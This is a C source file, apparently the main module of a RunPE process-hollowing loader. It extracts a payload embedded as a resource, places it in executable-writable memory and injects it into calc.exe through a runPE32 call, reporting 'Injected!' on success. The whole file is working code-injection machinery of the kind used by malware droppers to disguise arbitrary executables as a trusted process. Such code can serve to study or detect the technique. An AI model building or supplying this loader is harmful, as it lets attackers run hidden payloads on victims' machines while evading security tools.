#include <windows.h>
#include <stdio.h>

#include "resource.h"
#include "runpe.h"
#include "target_util.h"
#include "sysutil.h"

BYTE* get_raw_payload(OUT SIZE_T &res_size)
{
    HMODULE hInstance = GetModuleHandle(NULL);
    HRSRC res = FindResource(hInstance, MAKEINTRESOURCE(MY_RESOURCE), RT_RCDATA);
    if (!res) return NULL;

    HGLOBAL res_handle  = LoadResource(NULL, res);
    if (res_handle == NULL) return NULL;

    BYTE* res_data = (BYTE*) LockResource(res_handle);
    res_size = SizeofResource(NULL, res);

    BYTE* out_buf = (BYTE*) VirtualAlloc(NULL,res_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(out_buf, res_data, res_size);

    FreeResource(res_handle);
    return out_buf;
}

int main(int argc, char *argv[])
{
    BYTE* res_data = NULL;
    SIZE_T res_size = 0;

    if ((res_data = get_raw_payload(res_size)) == NULL) {
        printf("Failed!\n");
        return -1;
    }

    WCHAR targetPath[MAX_PATH];
    if (!get_calc_path(targetPath, MAX_PATH)) {
        return -1;
    }
    /*if (!is_compiled_32b()) {
        printf("[ERROR] Not supported! System is NOT 32 bit\n");
        system("pause");
        return (-1);
    }*/
    if (runPE32(targetPath, res_data, res_size)) {
        printf("Injected!\n");
    } else {
        printf("Injection failed\n");
    }
    VirtualFree(res_data, res_size, MEM_FREE);
    system("pause");
    return 0;
}
